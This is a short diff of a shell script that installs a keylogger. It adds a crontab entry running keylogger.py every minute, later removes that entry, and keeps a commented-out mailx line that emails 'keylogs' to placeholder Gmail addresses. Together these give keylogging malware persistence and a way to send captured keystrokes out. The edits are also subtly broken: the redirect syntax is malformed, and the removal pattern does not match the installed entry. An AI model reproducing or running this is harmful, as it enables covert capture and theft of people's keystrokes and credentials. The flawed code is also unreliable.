@@ -2,7 +2,7 @@
 
 # add crontab to run the keylogger every minute
 
-crontab -l 2>/dev/null| cat - <(echo "* * * * * python3 $(pwd)/keylogger.py") | crontab -
+crontab -l 2>/dev/null| cat - <(echo "* * * * * python3 $(pwd)/keylogger.py &2>>../logs/errors/cronjob_errors.txt") | crontab -
 
 
 ### install pip ###
@@ -17,7 +17,7 @@ python3 -m pip install -r requirements.txt
 sleep 90
 
 # rm cronjob
-crontab -u $USER -l | grep -v '* * * * * python3 keylogger.py'  | crontab -u $USER -
+crontab -u $USER -l | grep -v '* * * * * python3 keylogger.py &2>>../logs/errors/cronjob_errors.txt'  | crontab -u $USER -
 
 # echo hi.tmp | mailx -s "keylogs $(date)" -r sender_email@gmail.com receiver_email@gmail.com
 
